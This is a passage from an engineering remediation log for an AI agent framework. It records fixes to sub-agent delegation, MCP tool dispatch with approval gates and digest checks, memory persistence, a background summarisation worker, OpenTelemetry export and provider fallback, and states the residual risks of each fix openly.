  and *same* session, so `_get_cost_tracker(session_id)` (the SR-3.4
  residual fix) returns the exact same `CostTracker` object for every
  call — no separate cross-child aggregation logic needed. Real
  concurrency: `run_all()` now schedules subtasks in dependency-ordered
  "waves" via `concurrent.futures.ThreadPoolExecutor(max_workers=MAX_CONCURRENT)`
  — every task in a wave (all dependencies already satisfied) genuinely
  runs in parallel, capped at `MAX_CONCURRENT`; a task with an unmet
  dependency waits for the next wave. `run_subtask()` itself also kept
  its own semaphore acquire as defense-in-depth, for any caller that
  invokes it directly rather than through `run_all()`'s pool. Added
  `MAX_SUB_AGENT_DEPTH = 2`: threaded an explicit `_delegation_depth`
  parameter down `AgentRuntime.run()` → `_run_loop()` → `_tool_loop()` →
  `_execute_tool()` (an *explicit* parameter, not a `threading.local`/
  `contextvars.ContextVar`, since values in those do not reliably
  propagate into a new OS thread spawned by `ThreadPoolExecutor` without
  manual `copy_context()` plumbing — an implicit-propagation approach
  here would have been a real, silent way for the depth guard to be
  bypassed under concurrency). Added a new `delegate_task` tool
  (`missy/tools/builtin/delegate_task.py`), dispatched through
  `_execute_tool()`'s existing kwarg-injection pattern (mirroring
  SR-3.3's memory-store injection and SR-4.2 depth): `_runtime`,
  `_session_id`, `_depth` are all injected, never model-suppliable. The
  tool refuses with a clear error at `_depth >= MAX_SUB_AGENT_DEPTH`
  ("Delegation depth limit (2) reached...") and at missing runtime
  context, before ever calling `parse_subtasks()`/`SubAgentRunner`.
  Live-verified end-to-end (no mocks on the concurrency-timing
  assertions): (1) three independent subtasks each simulating a 0.3s
  provider call finished in ~0.37s total via the real `SubAgentRunner`
  against a real `AgentRuntime`, with call-start timestamps within
  0.6ms of each other — genuine parallelism, not sequential dressed up
  with an unused semaphore; (2) a sequential (`then`-chain) delegation
  with a tight `max_spend_usd` cap correctly raised
  `BudgetExceededError` on the second dependent step once the first
  step's spend had been recorded against the shared session tracker;
  (3) `delegate_task` at `_depth=MAX_SUB_AGENT_DEPTH` refuses
  immediately with no provider call attempted, confirmed via the real
  registered tool, not a stub. Corrected `CLAUDE.md`'s
  `SubAgentRunner` description (was "Spawns child agent instances,"
  vague enough to already sound wired; now states the actual production
  wiring, shared-runtime budget model, and depth bound) and
  `docs/implementation/module-map.md`'s corresponding entries (module +
  new builtin-tool table row). 40 new/updated regression tests across
  `tests/agent/test_sub_agent.py` (rewritten `TestSubAgentRunner` for
  the new shared-runtime constructor, plus new `TestRealConcurrency`
  and `TestMaxSubAgentDepth` classes), `tests/tools/test_delegate_task.py`
  (new file), `tests/agent/test_runtime_deep.py` (new
  `TestDelegateTaskDispatch`), and two pre-existing files
  (`tests/agent/test_agent_modules.py`,
  `tests/agent/test_approval_subagent_edges.py`) whose
  `SubAgentRunner(runtime_factory=...)` construction calls no longer
  compile against the new constructor — updated to the shared-runtime
  API while preserving each test's original intent (including the
  concurrency-cap test, which still verifies `run_subtask()`'s own
  semaphore independent of `run_all()`'s pool). `tests/agent/`+
  `tests/tools/`+`tests/cli/`+`tests/unit/`+`tests/security/` (11,034
  tests) pass with no regressions.
- **Residual risk, called out explicitly:** concurrent same-wave
  sub-agent calls have a real, deliberately-not-hidden TOCTOU race in
  budget enforcement — `_check_budget()` is checked *before* a
  provider call, and cost is only recorded *after* it returns, so
  several subtasks launched in the same parallel wave can all pass
  their initial pre-spend check before any of them has committed spend,
  letting aggregate spend for that one wave transiently exceed a very
  tight `max_spend_usd` cap (live-reproduced: a `$0.00001` cap with 3
  fully-independent subtasks let all 3 complete, since none of the 3
  concurrent checks saw a sibling's not-yet-recorded cost; the
  *sequential/dependent* case, tested separately, correctly denies once
  a prior wave's spend is recorded). This is the same category of risk
  SR-3.4's original ordering defect addressed for a *single* call
  stream — extending atomic check-and-reserve semantics across
  concurrent siblings would require a real reservation/pre-commit
  mechanism in `CostTracker`, which does not exist yet and is out of
  scope for this checkpoint (SR-4.2 was about making concurrency and
  budget-sharing genuinely work, not about closing every timing gap
  concurrency introduces). The `MAX_CONCURRENT = 3` cap bounds how bad
  this can get for any single wave (at most ~3 calls' worth of
  over-spend), and every subsequent wave is correctly gated by the
  now-committed total. `is_compound_task()`/`make_done_prompt()`/
  `DoneCriteria`-style "self-declared conditions" have no equivalent
  here either — `delegate_task`'s own completion is still governed by
  the normal SR-4.4 done-criteria gate on whichever call site invoked
  it. Tool-group membership (`missy/policy/tool_policy_pipeline.py`'s
  `MISSY_DISCORD_TOOLS`/`"coding"` curated lists) was deliberately left
  unmodified — `delegate_task` is reachable under `capability_mode="full"`
  today via the generic per-permission tool-visibility path, and curating
  which named groups should additionally include it is a policy-tuning
  question orthogonal to whether the wiring itself works correctly.

### SR-4.5 (SR-4.7) — MCP was management-only in practice; `McpManager.call_tool()`/`all_tools()` existed but nothing in `AgentRuntime` ever called them

- **Status: fixed.** Fifth §4 item. Product-policy decision confirmed
  with operator before implementing: wire real MCP tool execution into
  production with full enforcement, rather than the review's alternative
  of stating the management-only limitation truthfully in CLI/docs/Web
  UI. Chosen because MCP servers are explicitly operator-configured and
  digest-pinnable (`missy mcp add`/`missy mcp pin`) — a fundamentally
  different trust posture than SR-4.5's agent-authored-code question,
  closer to any other integration an operator opts into deliberately —
  so building the full reference-monitor-gated dispatch path was judged
  the more complete, still-safe outcome.
- **Reachability found:** `grep -n "mcp\|Mcp\|McpManager" missy/agent/runtime.py`
  (before this fix) matched nothing at all — `McpManager` was
  constructed and referenced only inside its own module files and
  `missy/cli/main.py`'s `missy mcp add/remove/list/pin` management
  commands. `McpManager.call_tool()` had real, working dispatch logic
  (safe-name validation, prompt-injection scanning of results) and
  `all_tools()` returned properly namespaced tool definitions, but no
  code path anywhere fed either into `AgentRuntime._get_tools()` or
  `_execute_tool()` — an agent could never actually invoke an MCP tool,
  regardless of how many servers were connected and pinned via `missy
  mcp add`/`pin`. Digest verification (SR-1.11) only ran once, at
  `add_server()`/connect time — a compromised or malicious server could
  mutate its live tool manifest after that point (widening a tool's
  effective behavior) with no reconnect required, and nothing would
  re-check it before the next call. `ToolAnnotation.requires_approval`
  (already computed correctly from MCP's `destructiveHint` at parse
  time, per `AnnotationRegistry`) was stored but never consulted by
  anything before a call — there was no call site to consult it at.
- **Remediation evidence:** `McpManager.call_tool()` is now the single
  dispatch chokepoint enforcing both concerns immediately before every
  call, not only at connect time: (1) re-verifies the pinned digest
  against the currently-connected client's live `tools` list — a
  mismatch denies the call and emits an `mcp.tool_execute` audit event
  with `reason="digest_mismatch_at_call_time"`, distinct from SR-1.11's
  existing connect-time check; (2) consults
  `annotation.to_policy_hints()["requires_approval"]` (true for
  destructive/mutating tools) and, if set, blocks on a newly-threaded
  `approval_gate: Any | None` (constructor param, defaults to `None`) —
  absence of a configured gate is treated as absence of confirmation
  infrastructure and fails closed (denies, `reason="no_approval_gate"`),
  matching SR-2.2's established fail-closed-without-confirmation
  precedent exactly; approval denial/timeout (via the real
  `ApprovalGate.request()`, which raises `ApprovalDenied`/
  `ApprovalTimeout`) is caught and also denies. Added a new
  `McpToolWrapper(BaseTool)` (`missy/mcp/tool_wrapper.py`) that adapts
  a connected MCP tool into a real `BaseTool` — this is what makes
  "register tools through the reference monitor" literally true rather
  than a parallel special-cased path: `AgentRuntime._sync_mcp_tools()`
  (called at the top of `_get_tools()` every turn, so newly
  connected/disconnected servers are reflected on the very next turn)
  calls `registry.register()` for each currently-connected MCP tool,
  after which dispatch goes through the exact same
  `ToolRegistry.execute()` → `_check_permissions()` →
  `tool.execute()` → (here) `McpManager.call_tool()` path, and the same
  `tool_execute` audit event, as any built-in tool — `McpManager`'s own
  `mcp.tool_execute` event captures the MCP-specific decisions (digest
  drift, approval outcome) the generic registry has no visibility into,
  on top of that. `McpToolWrapper`'s `ToolPermissions` are derived from
  the tool's annotation (`network_access`/`filesystem_access`/
  `mutating`) — documented explicitly as coarse: an arbitrary MCP tool
  runs as its own external process, not through
  `PolicyHTTPClient`/Missy's filesystem layer, so this signals intent
  to the policy engine without concretely constraining which host/path
  the external process actually touches; the digest pin and approval
  gate are the concrete, enforceable MCP-specific controls, not the
  coarse permission declaration. Threaded `AgentConfig.mcp_approval_gate`
  through to `McpManager` construction (`AgentRuntime._make_mcp_manager()`);
  wired `missy gateway start`'s existing SR-2.2 `ApprovalGate` into both
  the interactive and Discord `AgentRuntime` instances it constructs, so
  real approval flows work end-to-end for MCP tools running under the
  gateway, matching how the same gate already serves proactive triggers.
  Live-verified end-to-end with a real `McpManager`+`McpClient` (no real
  subprocess, but no other mocking) plus a real `AgentRuntime`/
  `ToolRegistry`: (1) a digest-matched, non-destructive MCP tool call
  dispatches through `_execute_tool()` → the real registry → the real
  wrapper → `McpManager.call_tool()` and returns the actual server
  result; (2) a pinned digest that no longer matches the live manifest
  denies the call with zero dispatch to the underlying client;
  (3) a destructive tool with no approval gate configured is denied,
  end-to-end through `_execute_tool()`, before the client is ever
  touched; (4) a gate that approves lets the call proceed; a gate that
  raises `ApprovalDenied` blocks it. Corrected `CLAUDE.md`'s MCP section
  (previously silent on whether tools were callable — an ambiguity the
  review specifically flagged as needing a truthful statement one way or
  the other) and `docs/security.md`'s "MCP Server Isolation" section,
  and added a new `docs/implementation/module-map.md` entry for
  `missy.mcp.tool_wrapper`. 30 new regression tests:
  `tests/mcp/test_mcp_manager.py::TestCallToolEnforcement` (9 tests
  covering digest match/drift/unpinned, approval denied/granted/
  denied-by-gate, read-only/unannotated tools never gating),
  `tests/mcp/test_mcp_tool_wrapper.py` (new file, 17 tests covering
  construction, permission derivation, schema pass-through, and
  execute()'s success/blocked-prefix mapping), and
  `tests/agent/test_runtime_deep.py::TestMcpToolDispatch` (4 tests
  exercising the real `_get_tools()`/`_execute_tool()`/`ToolRegistry`
  path). Fixed 2 pre-existing test files
  (`tests/unit/test_mcp_tool_name_validation.py`,
  `tests/security/test_scheduler_jobs_selfcreate_webhook_mcp_hardening.py`)
  whose `McpManager.__new__()` manual-construction shortcuts didn't set
  the new attributes `call_tool()` now reads (`_config_path`,
  `_approval_gate`, `_block_injection`, `_annotation_registry`) —
  fixing this surfaced that 2 of those tests had been exercising
  `_block_injection=False` (the "warn only" branch) purely by accident
  (the manual construction never set the attribute, so `getattr(...,
  False)` silently defaulted to the non-default behavior) rather than
  the real `McpManager()` default of `block_injection=True` ("block
  outright") — same root-cause pattern flagged repeatedly this session
  (a test bypassing real construction ends up exercising unrealistic
  state); fixed by having those 2 tests explicitly set
  `_block_injection = False` (preserving their original intent) and
  adding a new `test_injection_blocked_by_default` test confirming the
  real default. `tests/agent/`+`tests/mcp/`+`tests/tools/`+`tests/cli/`+
  `tests/unit/`+`tests/security/`+`tests/integration/` (11,954 tests)
  pass with no regressions.
- **Residual risk:** Missy has no way to enforce network/filesystem
  policy on what an MCP server process itself does once its own
  subprocess is running (it is a separate process — see
  `docs/security.md`'s existing "MCP Server Isolation" section for the
  environment-variable/timeout/response-size controls that *are*
  enforced at the process boundary); the digest pin and approval gate
  are the practical trust controls for MCP, not network/filesystem
  policy, and this checkpoint does not change that structural fact — it
  makes those two controls actually apply at call time instead of only
  at connect time. `McpToolWrapper`'s coarse permission declaration
  means the policy engine's network/filesystem checks are effectively
  advisory for MCP tools specifically (no concrete `allowed_hosts`/
  `allowed_paths` can be resolved for an arbitrary third-party tool);
  this is called out explicitly rather than left implicit. No rate
  limiting or per-server budget cap exists for MCP tool calls
  specifically (they consume the calling session's ordinary
  `max_spend_usd`/iteration budget like any other tool call, but there
  is no MCP-specific circuit breaker beyond `health_check()`'s dead-server
  restart) — a future session could add one if MCP servers turn out to
  be a common source of runaway calls.

### SR-4.6 (SR-4.1) — learnings were extracted but never persisted; SleeptimeWorker was fully built but never instantiated

- **Status: fixed.** Sixth §4 item, two independent sub-findings under
  one review item.
- **Sub-finding 1 (mechanical bug, fixed directly, no product-policy
  question involved):** `AgentRuntime._record_learnings()` called the
  real `extract_learnings()` function, producing a genuine
  `TaskLearning` record every time a tool-augmented run completed, but
  then only passed it to `logger.debug(...)` and discarded it — it
  never called `self._memory_store.save_learning(learning)`, despite
  that method existing, fully implemented, and already used correctly
  by the *retrieval* half of the same feature
  (`_build_context_messages()`'s `get_learnings(limit=5)` call, which
  injects recent learnings into context). The `learnings` SQLite table
  was therefore permanently empty in production, in every
  configuration, regardless of how many tool-augmented tasks completed
  — `CLAUDE.md`'s own claim "`Learnings`: Extracts task_type/outcome/
  lesson from tool-augmented runs, **persisted in SQLite**" was false
  for the persisted half specifically. Live-reproduced end-to-end
  through the real `AgentRuntime.run()` with a real `SQLiteMemoryStore`:
  a completed tool-augmented run left `get_learnings(limit=5)` empty.
  Fixed: added the missing `self._memory_store.save_learning(learning)`
  call (guarded by `self._memory_store is not None`, and by the
  existing broad `except Exception` — persistence failure is best-effort
  and must not crash a completed run, matching the extraction call's
  own error-handling posture). Live re-verified: the same reproduction
  now shows `get_learnings(limit=5)` returning the real persisted
  lesson string immediately after the run completes.
- **Sub-finding 2 (product-policy decision, asked and confirmed with
  the operator):** `grep -rln "SleeptimeWorker" missy/` matched only
  `missy/agent/sleeptime.py` itself — a fully-built, tested (688
  pre-existing lines in `tests/agent/test_sleeptime.py`) background
  daemon thread with zero production construction sites anywhere. Its
  own module docstring literally documents the exact three-point
  `AgentRuntime` integration needed (construct+start in `__init__`,
  `record_activity()` at the top of `run()`, `stop()` on cleanup) — none
  of which existed. Asked whether to wire it in opt-in-off-by-default,
  wire it in exactly as documented (matching `SleeptimeConfig.enabled=True`,
  its own class default), or leave it unwired and document the
  limitation, since the worker makes background LLM calls (consuming
  budget) and processes conversation content without an explicit
  per-turn user action — a genuine privacy/cost design question, not a
  mechanical bug. **Operator chose: wire it in exactly as documented,
  enabled by default.** Fixed: added `AgentRuntime._make_sleeptime_worker()`
  (graceful-degradation pattern matching `_make_mcp_manager()` etc.),
  constructing `SleeptimeWorker(memory_store=self._memory_store,
  provider_registry=<live registry or None>)` and calling `.start()` in
  `__init__`. Added `record_activity()` calls at the top of `run()`,
  `run_stream()` (which can bypass `run()` entirely via its single-turn
  streaming path), and `resume_checkpoint()` — every real entry point
  that represents genuine agent activity, so the worker never processes
  memory concurrently with an active run. Added a new
  `AgentRuntime.shutdown()` method (didn't exist before) that stops the
  worker cleanly; documented as needed for long-running processes
  (`missy gateway start`) but not strictly required for short-lived ones
  (`missy ask`), since the worker is a daemon thread that dies with the
  process regardless. Live-verified: a fresh `AgentRuntime()` genuinely
  starts a live `missy-sleeptime` daemon thread; `shutdown()` stops it
  (confirmed via `Thread.is_alive()` before/after); the worker's
  `_memory_store` is confirmed to be the exact same object as the
  runtime's own `_memory_store`, not a disconnected copy. Verified the
  wiring does not destabilise the test suite before finalizing: a real
  `AgentRuntime()` now starts one real OS thread per instantiation
  (previously zero), so `tests/agent/` (4,199 tests, the directory that
  constructs `AgentRuntime` most heavily) was timed and run in full —
  35.88s, all passing, no thread-exhaustion or slowdown symptoms
  observed (the worker's first wake is 60s away and real processing only
  triggers after 300s of idle, both far outside any single test's
  runtime, so essentially no test ever reaches the worker's actual
  processing code path — only cheap thread creation/teardown overhead is
  incurred). Corrected `CLAUDE.md`'s `SleeptimeWorker` entry (was a
  generic feature description that read as ambiguous about wiring
  status; now states the concrete construction/activity/shutdown
  integration and defaults).
- **Remediation evidence, test counts:** 12 new/updated regression
  tests — `tests/agent/test_coverage_gaps.py::TestRuntimeRecordLearnings`
  (4 new tests: persists-to-memory-store, no-memory-store-does-not-raise,
  save-failure-does-not-raise, end-to-end-via-real-SQLiteMemoryStore) and
  `tests/agent/test_runtime_deep.py::TestSleeptimeWiring` (8 new tests:
  constructed-and-started, shutdown-stops-thread, shutdown-idempotent,
  shutdown-with-no-worker, run()-records-activity, run()-without-worker,
  resume_checkpoint()-records-activity, worker-shares-real-memory-store).
  Fixed 1 pre-existing test
  (`tests/unit/test_gateway_timeout_url_validation.py::TestStreamingFallbackLogging::test_streaming_failure_logged`)
  whose manual `AgentRuntime.__new__()` construction hadn't set the new
  `_sleeptime` attribute `run_stream()` now reads.
  `tests/agent/`+`tests/cli/`+`tests/unit/`+`tests/memory/`+
  `tests/security/`+`tests/mcp/`+`tests/tools/`+`tests/integration/`+
  `tests/scheduler/` (12,908 tests) pass with no regressions — the one
  failure observed
  (`tests/security/test_property_based_fuzz.py::TestNetworkPolicyEngineFuzz::test_check_host_never_crashes_on_arbitrary_unicode`)
  is the pre-existing, already-documented intermittent Hypothesis
  deadline flake (unmocked live DNS resolution occasionally exceeding
  the 200ms default deadline), confirmed unrelated to this session's
  changes in an earlier checkpoint.
- **Residual risk:** `SleeptimeWorker`'s summarization step calls an LLM
  provider when `use_llm_summarization=True` (its own default) and a
  provider is reachable — meaning enabling it (now the default) means
  Missy will incur real, periodic, un-prompted API costs for any
  deployment with idle sessions containing enough unsummarised turns.
  This is the explicit, operator-confirmed trade-off of choosing "wire
  it in exactly as documented, enabled by default" over the opt-in
  alternative — called out here, not hidden, and should be mentioned in
  release notes if this branch ships, alongside SR-2.1/SR-2.2's
  existing behavior-change notes. No per-deployment retention/privacy
  policy hook exists yet for what the worker is allowed to summarize
  (e.g. excluding sessions flagged sensitive) — the review's phrasing
  explicitly calls for "policy, privacy, retention, and audit controls,"
  and only the "audit" piece (the worker already publishes
  `sleeptime.cycle.start`/`.complete`/`.error` events to the message bus)
  was already present before this checkpoint; policy/privacy/retention
  controls beyond the existing `SleeptimeConfig` tuning knobs
  (`idle_threshold_seconds`, `min_unprocessed_turns`, `batch_size`,
  `use_llm_summarization`) remain a follow-up if finer-grained control
  is needed.
- **Follow-up correction discovered within this same checkpoint, before
  finalizing:** the `tests/agent/`-only verification above (35.88s, no
  symptoms) was not representative of the full suite. Running the
  *complete* test suite with the wiring in place caused real resource
  accumulation: 96+ live `missy-sleeptime` daemon threads piled up
  (confirmed via a live full-suite run that tripped pytest's per-test
  `faulthandler_timeout=120` and left the process crawling at ~27% CPU
  rather than progressing normally) because the great majority of tests
  across the suite construct `AgentRuntime()` without ever calling the
  new `shutdown()` — entirely expected given `shutdown()` didn't exist
  before this checkpoint, so no existing test could have been written to
  call it. This was new evidence the operator's original "enabled by
  default" decision didn't have visibility into (the question asked
  beforehand covered background-LLM-cost/privacy trade-offs, not
  test-suite thread lifecycle), so it was surfaced back explicitly
  rather than silently patched over or silently reverted. Asked whether
  to (a) add a test-only autouse fixture that stops each test's
  worker(s) after the test, keeping the production default unchanged,
  or (b) revisit the default and make it opt-in given this concrete
  cost evidence. **Operator chose (a): keep the production default,
  fix the test suite.** Added a `conftest.py` (repo root) autouse
  fixture `_stop_sleeptime_workers_after_test` that wraps
  `AgentRuntime._make_sleeptime_worker` for the duration of each test,
  recording every real worker it constructs, and calls
  `worker.stop(timeout=1.0)` on each in teardown — production code and
  the real `start()` call are completely untouched (tests that
  specifically assert the thread is alive, e.g.
  `TestSleeptimeWiring::test_sleeptime_worker_constructed_and_started`,
  still see a genuine live thread *during* the test; the fixture only
  intervenes at teardown). Live-verified via a real 50×
  `AgentRuntime()`-construction test with no explicit `shutdown()`
  calls, followed by a separate assertion test confirming zero
  `missy-sleeptime` threads remained afterward — both pass. Re-ran the
  full non-`tests/vision/` suite that previously piled up threads and
  tripped the timeout: `12,909 passed, 1 failed (the pre-existing,
  already-documented Hypothesis deadline flake), 13 skipped in 196.91s`
  — no timeout, no thread accumulation, no slowdown. Added 2 permanent
  regression tests to `TestSleeptimeWiring`
  (`test_conftest_fixture_prevents_thread_accumulation_across_tests`,
  `test_no_sleeptime_threads_leaked_from_previous_test`) as a standing
  guard against this specific failure mode recurring if the fixture is
  ever accidentally removed or the wrapped method's name changes.

### SR-4.7 (SR-4.6) — `OtelExporter.subscribe()` always raised `TypeError`, silently caught; OTLP export received zero events in every configuration

- **Status: fixed.** Seventh §4 item, purely mechanical (no
  product-policy question involved) — the fix reuses an
  already-established pattern (`AuditLogger`'s publish-wrapping) rather
  than introducing new design surface.
- **Reachability found and live-reproduced:**
  `OtelExporter.subscribe()` called `event_bus.subscribe(_handler)`
  with a single positional argument, but
  `missy.core.events.EventBus.subscribe(self, event_type: str,
  callback: EventCallback)` requires **two** — `_handler` filled the
  `event_type` slot and `callback` was simply missing. This call always
  raised `TypeError: EventBus.subscribe() missing 1 required positional
  argument: 'callback'`, caught by `subscribe()`'s own broad
  `except Exception` and merely logged as a warning. Live-reproduced
  through the real classes (`OtelExporter` + real `event_bus`, no
  mocks): `OtelExporter(...)` connected successfully
  (`is_enabled=True`), `subscribe()` logged "subscribe failed", and a
  subsequently published `AuditEvent` produced no span at all — meaning
  **every configuration with `otel_enabled: true` exported nothing,
  ever**, regardless of collector reachability, protocol, or which
  events were published. Separately, `EventBus` (the bus `AuditEvent`s
  actually flow through) has no wildcard/catch-all subscription mode at
  all — `_subscribers: dict[str, list[EventCallback]]` is keyed by
  exact `event_type` string, so even a syntactically correct
  `subscribe(event_type, callback)` call could only ever receive one
  specific event type, never "every event" as the class's own docstring
  promised ("Subscribes to the event bus and forwards events as OTLP
  spans"). `AuditLogger` (`missy/observability/audit_logger.py`) had
  already solved exactly this problem for the on-disk JSONL log, by
  wrapping the bus instance's `publish()` method itself rather than
  using `subscribe()` — confirmed via its own docstring, which
  explicitly documents this as deliberate: "wraps
  `EventBus.publish`... so that every published event — regardless of
  its `event_type` — is captured without requiring per-type
  subscription registrations." `export_event()` also never redacted
  `detail` before setting span attributes — a live gap mirroring
  SR-1.10 (audit-sink redaction) for the OTLP export path specifically,
  since `AuditLogger`'s SR-1.10 fix only covers its own on-disk write
  path, not `OtelExporter`'s independent one. Export failures were only
  ever `logger.debug(...)`'d — invisible in default logging
  configuration, with no counter or inspectable state an operator or
  `missy doctor`-style check could query. `BatchSpanProcessor(exporter)`
  was constructed with zero explicit parameters, relying entirely on
  undocumented-in-this-codebase OTel SDK defaults for queue/batch
  bounds. Also found, while implementing the fix: `init_otel()`'s
  disabled-config path returned `OtelExporter.__new__(OtelExporter)` —
  skipping `__init__` entirely, leaving **zero** instance attributes
  set — so touching `.is_enabled` (or anything else) on that stub raised
  `AttributeError` immediately; `tests/unit/test_infrastructure.py`
  had two tests that literally asserted this broken state as correct
  (`assert not hasattr(exporter, "_enabled")`, with a comment
  describing the bug precisely) rather than flagging it — the same
  "test encodes a known-broken behavior as expected" pattern found
  repeatedly this session (SR-3.5, SR-3.2).
- **Remediation evidence:** `subscribe()` now wraps `event_bus.publish`
  directly (mirroring `AuditLogger`'s exact pattern — captures the
  original bound `publish`, installs a closure that calls it first then
  calls `export_event()`, assigns the closure back onto the bus
  instance), which is what makes "every event, any type" genuinely
  true. `export_event()` now imports and applies
  `missy.observability.audit_logger._redact_detail` (the real SR-1.10
  function, reused rather than reimplemented, so the two redaction
  paths cannot drift independently) to `detail` before any value
  becomes a span attribute. Failures now increment a new
  `export_failure_count` and record `last_export_error`, and log at
  `WARNING` (not `DEBUG`) with the running failure count in the
  message. `BatchSpanProcessor` is now constructed with explicit
  `max_queue_size=2048`, `max_export_batch_size=512`,
  `schedule_delay_millis=5000`, `export_timeout_millis=30000` (all
  overridable via new `OtelExporter.__init__` parameters) — deliberate,
  documented values rather than implicit SDK defaults. Added
  `_disabled_stub()` (replacing the bare `__new__()` call) that
  explicitly initialises every attribute a real caller might read, so
  `init_otel()`'s disabled path is safe to introspect. Live-verified
  end-to-end with the real `opentelemetry-sdk`/`opentelemetry-exporter-
  otlp-proto-grpc` packages installed (not previously present in this
  dev environment; installed alongside this fix specifically to enable
  real verification rather than asserting only that internal methods
  were called): (1) constructing a real `OtelExporter`, calling the
  real `subscribe()`, then publishing a real `AuditEvent` through the
  real `event_bus` no longer logs "subscribe failed" and the SDK's
  `BatchSpanProcessor` genuinely attempts real network delivery to the
  configured `localhost:4317` endpoint (observed via the SDK's own
  "Connection refused, retrying" log lines — proof the full config →
  subscribe → publish → export → network-attempt chain is live, not
  merely internally self-consistent); (2) using
  `InMemorySpanExporter` as a stand-in "collector" (obtaining a tracer
  directly from a locally-constructed `TracerProvider` rather than the
  process-global `trace.set_tracer_provider()` API, since that global
  can only be set once per process and an earlier test in the same run
  already claims it — a real cross-test-isolation subtlety discovered
  while writing this verification, not a production bug), a published
  event genuinely arrives as a span with the correct name and
  attributes, across three arbitrary/unrelated `event_type` strings, not
  just one — confirming the fix isn't accidentally type-scoped like the
  original bug implicitly was; (3) a secret embedded in `detail.url`
  never reaches the "collector" unredacted. Fixed 2 pre-existing test
  files whose tests exercised the now-removed `event_bus.subscribe()`
  call path directly (`mock_bus.subscribe.assert_called_once()`-style
  assertions no longer apply since `subscribe()` doesn't call that
  method at all anymore) — rewritten to assert the new wrap-publish
  behavior instead of the removed one; corrected the two
  `test_infrastructure.py` tests that had encoded the disabled-stub
  crash as expected behavior to assert the fixed, safe behavior
  instead. `tests/observability/`+`tests/cli/`+`tests/integration/`+
  `tests/unit/`+`tests/security/` (5,980 tests) pass with no
  regressions — the one observed failure is the already-documented
  pre-existing Hypothesis deadline flake, unrelated. Corrected
  `CLAUDE.md`'s Observability section (previously silent on whether
  OTLP export actually worked once enabled) and
  `docs/implementation/module-map.md`'s `missy.observability.otel`
  entry.
- **Residual risk:** the OTel SDK's `BatchSpanProcessor` (even with
  explicit bounds now) still silently drops spans once its queue fills
  if the collector is unreachable for a sustained period — this is
  standard, documented OTel SDK behavior (a full queue drops new spans
  rather than blocking the publishing thread, which is the correct
  choice for a diagnostics/telemetry path that must never itself
  degrade agent responsiveness) and not something this checkpoint
  changes; `export_failure_count`/`last_export_error` only capture
  failures `export_event()` itself observes synchronously (span
  creation/attribute-setting), not asynchronous network-export failures
  the SDK's background export thread encounters after the span has
  already been handed off — those remain visible only in the SDK's own
  logger output (`opentelemetry.exporter.otlp.*`), not through
  `OtelExporter`'s new counters. A future session wanting fully unified
  failure visibility would need to either poll the SDK's own internal
  metrics/callbacks (not all exporters expose these) or accept that
  network-level export health is a separate signal from
  application-level export attempts. No `missy doctor` check currently
  surfaces `export_failure_count`/`is_enabled` for OTLP specifically
  (other subsystems' doctor checks were not extended as part of this
  checkpoint, which was scoped to the review's four explicit
  sub-items — subscription compatibility, failure surfacing via the new
  properties, bounded queues, and redaction — not to building new CLI
  surface); wiring those properties into `missy doctor`'s existing
  output would be a reasonable, small follow-up.

### SR-4.8 — Provider rotation/fallback were config-documented capabilities with either zero production call sites or a static, start-of-run-only check

- **Status: fixed.** Eighth and final §4 item — closes section 4
  ("Advertised But Unwired Features") of the security review entirely.
  Operator-confirmed scope: build the full production mechanism
  (cooldown/retry-eligibility state via per-provider `CircuitBreaker`
  instances, budget-gated and tool-compatibility-ordered fallback
  candidate selection, and a complete redacted audit trail) rather than
  a smaller bounded fix or documentation-only correction — this closes
  the gap most completely of the three options the operator was
  offered, at the cost of being the largest single §4 change this
  session.
- **Reachability found and live-reproduced:** three independent gaps,
  each confirmed against real (non-mocked) classes before any fix:
  1. `ProviderRegistry.rotate_key()` (round-robin `api_keys` rotation)
     had **zero production call sites** anywhere in the codebase — not
     in `AgentRuntime`, not in any CLI command, not in the scheduler.
     It was extensively unit-tested in isolation (`tests/providers/
     test_registry_deep.py`, `tests/unit/test_learnings_providers_edges.py`,
     etc.) but never invoked by anything a real deployment would run.
  2. `ModelRouter`/`score_complexity()`/`select_model()` (fast/primary/
     premium tier routing by prompt complexity) likewise had zero
     production callers — confirmed via a full-repo grep outside its own
     module and test files. `fast_model`/`premium_model` config fields
     are consumed directly by `SleeptimeWorker._llm_summarize()`
     (`missy/agent/sleeptime.py`), bypassing `ModelRouter` entirely, so
     the tier-selection *config surface* partially works but the
     *routing engine* CLAUDE.md described does not exist in the runtime
     path.
  3. `AgentRuntime._get_provider()`'s "automatic fallback" (the only
     other fallback-shaped code in the runtime) is a **static,
     start-of-run-only check**: it resolves the configured provider
     once per `run()`/`run_stream()` call, and only falls back to
     `registry.get_available()[0]` if `provider.is_available()` (SDK
     installed + API key present — a purely local check, never a live
     reachability probe) is `False` *before the first call is even
     made*. Live-reproduced: a provider that passes this static check
     but then raises `ProviderError` on the actual `complete_with_tools()`
     call (simulating an expired key, a 429, or a transient 500)
     propagates straight out of `_tool_loop()`'s blanket `except
     Exception` handler with **zero retry, zero key rotation, zero
     cross-provider fallback, and zero audit event** — the entire task
     fails despite a second, healthy, fully-configured provider sitting
     in the same registry. The resolved `provider` object is a single
     loop-local variable reused for every iteration of `_tool_loop()`
     and for `_single_turn()`, with no re-resolution path at all once
     the loop starts.
- **Fix:** `missy/providers/health.py` (new) —
  `classify_provider_error()` distinguishes `auth`/`rate_limit`/
  `timeout`/`unknown` from a `ProviderError`'s message text, reusing
  the message vocabulary every built-in provider (Anthropic, OpenAI)
  already raises consistently ("authentication failed", "rate
  limit(ed)", "timed out") rather than requiring a new structured error
  code. `ProviderRegistry.key_for()` (new) reverse-looks-up a provider
  instance's registry key by identity, since a provider's `.name`
  class attribute need not match the key it was registered under.
  `AgentRuntime._call_provider_with_fallback()` (new) is the single
  chokepoint both `_single_turn()` and `_tool_loop()`'s main iteration
  now route every provider call through:
  - Each provider name gets its own `CircuitBreaker`
    (`AgentRuntime._get_breaker_for()`), independent of the primary's
    existing `self._circuit_breaker` (unchanged, so existing tests that
    swap it directly keep working) — cooldown/half-open state is
    tracked per candidate, not globally.
  - An `auth`-classified failure with `len(config.api_keys) > 1`
    triggers exactly one `rotate_key()` retry on the *same* provider
    before falling over — confirmed live to actually flip the
    provider's real `_api_key`/`api_key` attribute (not just call
    `rotate_key()` and ignore the result), and confirmed to be skipped
    entirely for `rate_limit`/`timeout`/`unknown` failures, since
    rotating credentials cannot fix any of those.
  - A pre-flight `_check_budget()` call gates the fallback attempt
    itself, reusing SR-3.4's existing per-session `CostTracker` — an
    exhausted budget raises `BudgetExceededError` before any fallback
    candidate is even tried, not after spending further billed calls
